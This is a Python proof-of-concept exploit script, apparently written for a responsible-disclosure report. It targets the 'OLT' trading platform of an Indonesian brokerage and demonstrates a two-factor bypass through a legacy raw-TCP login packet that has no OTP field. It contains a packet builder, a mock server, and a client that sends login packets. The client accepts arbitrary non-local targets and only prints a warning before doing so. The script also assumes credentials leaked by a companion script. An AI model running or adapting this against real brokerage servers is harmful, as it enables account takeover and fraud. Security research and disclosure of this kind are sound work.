#!/usr/bin/env python3
"""poc05_otp_bypass.py
OLT Platform - structural OTP bypass on the legacy raw-TCP login path (HIGH)
=============================================================================
The OLT launcher supports TWO authentication paths:

  1) HTTPS auth        (auth/login, auth/otp, Authorization: Bearer ...)
       -> where OTP, when enabled by the broker, is enforced.
  2) Legacy raw TCP    (msgLoginToLB -> <MainPublic>:8801, plain TCP, no TLS)
       -> 52-byte packet with fields ONLY for username/password/broker/type.
       -> structurally cannot carry (or be challenged with) an OTP.

The clinching fact (from the packet layout - also reproduced by poc02):
  [0:4)  int32 length
  [4)    0x01
  [5)    '0'
  [6:26) USERNAME (20 bytes ASCII)
  [26:46) PASSWORD (20 bytes ASCII)
  [46)   '1'
  [47:51) BROKER  (4 bytes)
  [51)   type '1'..'4'
  (52 bytes total) -- no OTP/token/session field exists.

An attacker with the client binary (public product) plus leaked credentials
(recoverable via poc01) therefore authenticates to the trading server using
the legacy path WITHOUT ever being asked for OTP. This PoC demonstrates it
with a LOCAL emulator only; it never touches production networking unless
the operator explicitly targets a staging host with written authorization.

LAB-ONLY modes:
  structural            : print the static proof (no network).
  --otp-server          : run the mock OLT server on 127.0.0.1 (default :8801).
  --local               : send a real msgLoginToLB packet to the local emulator
                          and print the handshake (shows no OTP challenge).
  --target host:port    : only for an authorized STAGING environment.

Usage:
  python3 poc05_otp_bypass.py [structural]
  python3 poc05_otp_bypass.py --otp-server [--port 8801] [--delay 0.5]
  python3 poc05_otp_bypass.py --local [--port 8801] [--user TRADER001] \\
                               [--pass P@ssw0rd123] [--broker II] [--type 1]
Dependencies: none (stdlib).
"""
import sys
import socket
import struct
import threading
import time
import select

DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 8801

# Strings found in OLTLauncher.exe (#US heap, UTF-16LE) proving OTP lives on
# the HTTPS path only, while the TCP path carries no OTP artefacts.
OTP_HTTPS_EVIDENCE = [
    "auth/login",
    "auth/otp",
    "otp",
    "Authorization",
    "Bearer",
    "Use Authentication",
    "chkAuth",
]

TCP_PATH_STRINGS = [
    "msgLoginToLB",
    "SendPacketToServer",
    "Log In Successfully",
    "Invalid User Login Or Password",
]


def build_login_packet(user, password, broker, ptype):
    u = user.encode("ascii", "replace")[:20].ljust(20, b" ")
    p = password.encode("ascii", "replace")[:20].ljust(20, b" ")
    b = str(broker).encode("ascii", "replace")[:4].ljust(4, b" ")
    t = str(ptype).encode("ascii")
    body = b"\x01" + b"0" + u + p + b"1" + b + t[:1].ljust(1, b"1")
    return struct.pack("<I", 4 + len(body)) + body


def label_fields(pkt):
    ln = struct.unpack_from("<I", pkt, 0)[0]
    out = []
    out.append(("[0:4)   int32 length", "%d (= 4 + body)" % ln))
    out.append(("[4)     marker", repr(pkt[4:5])))
    out.append(("[5)     sub-type", repr(pkt[5:6])))
    out.append(("[6:26)  USERNAME   20B", repr(pkt[6:26])))
    out.append(("[26:46) PASSWORD   20B", repr(pkt[26:46])))
    out.append(("[46)    marker2", repr(pkt[46:47])))
    out.append(("[47:51) BROKER     4B", repr(pkt[47:51])))
    out.append(("[51)    type 1..4", repr(pkt[51:52])))
    return out


def cmd_structural():
    print("=== PoC05 structural proof: no OTP in the TCP login path ===\n")
    print("(a) HTTPS path enforces OTP (strings present in the binary):")
    for s in OTP_HTTPS_EVIDENCE:
        print("       '%s'" % s)
    print("\n(b) TCP path (msgLoginToLB) carries these artifacts:")
    for s in TCP_PATH_STRINGS:
        print("       '%s'" % s)
    print("\n(c) msgLoginToLB packet layout (+ explicit field inventory):")
    pkt = build_login_packet("TRADER001", "P@ssw0rd123", "II", 1)
    for name, val in label_fields(pkt):
        print("       %-22s %s" % (name, val))
    print("\n(d) conclusion: the TCP login packet has no OTP/token/session field,")
    print("    so the server cannot (and per this protocol, does not) challenge")
    print("    the raw-TCP path with an OTP -> 2FA is bypassable via this path.")
    print("    (Emulate the exchange locally: --otp-server + --local)\n")


class MockOLTServer:
    """Minimal OLT-style server: reads length-prefixed frames, answers like the
    real login response '251 |Log In Successfully|', never challenges OTP."""

    OK = b"251 |Log In Successfully|"
    BAD = b"253 |Invalid User Login Or Password|"

    def __init__(self, host, port, delay=0.3):
        self.host, self.port, self.delay = host, port, delay
        self.packets = []

    def handle(self, conn):
        conn.settimeout(10)
        try:
            hdr = self._recvn(conn, 4)
            if len(hdr) < 4:
                return
            ln = struct.unpack("<I", hdr)[0]
            body = self._recvn(conn, ln - 4)
            frame = hdr + body
            self.packets.append(frame)
            print("[server] rx %d-byte frame: %s" % (len(frame), frame.hex()))
            if len(frame) >= 52 and frame[4:5] == b"\x01":
                try:
                    user = frame[6:26].decode("ascii").rstrip(" ")
                except Exception:
                    user = "?"
                print("[server] username='%s'  -> no OTP challenge emitted (by design)" % user)
                time.sleep(self.delay)
                conn.sendall(self.OK)
            else:
                conn.sendall(self.BAD)
        except Exception as e:
            print("[server] ! %s" % e)
        finally:
            conn.close()

    @staticmethod
    def _recvn(conn, n):
        """Read exactly n bytes, tolerating slow/segmented loopback delivery."""
        buf = b""
        while len(buf) < n:
            r, _, _ = select.select([conn], [], [], 10)
            if not r:
                raise socket.timeout("no data within 10s")
            chunk = conn.recv(n - len(buf))
            if not chunk:
                break
            buf += chunk
        return buf

    def serve(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            srv.bind((self.host, self.port))
        except OSError as e:
            print("[server] ! cannot bind %s:%s (%s)" % (self.host, self.port, e))
            sys.exit(1)
        srv.listen(5)
        print("[server] OLT mock listening on %s:%s (no OTP enforcement)" % (self.host, self.port))
        while True:
            c, _ = srv.accept()
            threading.Thread(target=self.handle, args=(c,), daemon=True).start()

    def run(self):
        try:
            self.serve()
        except KeyboardInterrupt:
            print("\n[server] stopped.")


def cmd_client(host, port, user, password, broker, ptype):
    if host not in ("127.0.0.1", "localhost", "::1"):
        print("""
  !!!  --target non-local terdeteksi  !!!
  Menghubungi server NON-lokal menuntut izin tertulis dari PT. Semesta
  Indovest Sekuritas (responsible disclosure / bounty). Jangan jalankan
  terhadap produksi. Tekan Ctrl-C untuk membatalkan.
""")
    pkt = build_login_packet(user, password, broker, ptype)
    print("== klien -> paket msgLoginToLB (%d byte) ==" % len(pkt))
    for name, val in label_fields(pkt):
        print("   %-22s %s" % (name, val))
    print("  hex: %s" % pkt.hex())
    s = socket.create_connection((host, port), timeout=6)
    s.sendall(pkt)
    resp = s.recv(4096)
    s.close()
    print("\n== respons server ==")
    print("  %r" % resp)
    print("\n== analisis ==")
    print("  server menjawab LOGIN tanpa pernah meminta OTP;")
    print("  tidak ada field OTP/token dalam paket -> OTP bypass terkonfirmasi (lab).")


def argv_get(name, default):
    if name in sys.argv:
        return sys.argv[sys.argv.index(name) + 1]
    return default


def main():
    args = sys.argv[1:]
    if "--otp-server" in args:
        port = int(argv_get("--port", DEFAULT_PORT))
        delay = float(argv_get("--delay", 0.3))
        MockOLTServer(DEFAULT_HOST, port, delay).run()
        return
    if "--local" in args:
        port = int(argv_get("--port", DEFAULT_PORT))
        if "--target" in args:
            hp = argv_get("--target", DEFAULT_HOST + ":%d" % DEFAULT_PORT)
            host, _, _ = hp.partition(":")
            port = int(_ or port)
        else:
            host = DEFAULT_HOST
        cmd_client(
            host,
            port,
            argv_get("--user", "TRADER001"),
            argv_get("--pass", "P@ssw0rd123"),
            argv_get("--broker", "II"),
            argv_get("--type", "1"),
        )
        return
    cmd_structural()


if __name__ == "__main__":
    main()